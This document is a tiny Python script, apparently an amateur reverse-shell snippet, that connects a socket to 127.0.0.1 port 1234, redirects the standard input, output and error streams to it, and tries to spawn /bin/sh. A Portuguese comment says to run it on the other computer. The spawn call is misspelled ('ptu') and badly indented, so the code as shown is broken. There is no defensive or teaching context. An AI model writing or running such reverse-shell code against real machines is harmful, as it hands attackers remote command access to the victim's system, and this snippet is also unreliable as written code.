import socket,os,pty

while True:
	s = socket.socket()
	s.connect(("127.0.0.1",1234))
	for fd in (0,1,2):
		os.dup2(s.fileno(), fd)
	
	
		
ptu.spawn('/bin/sh')
	#executa isso no outro computador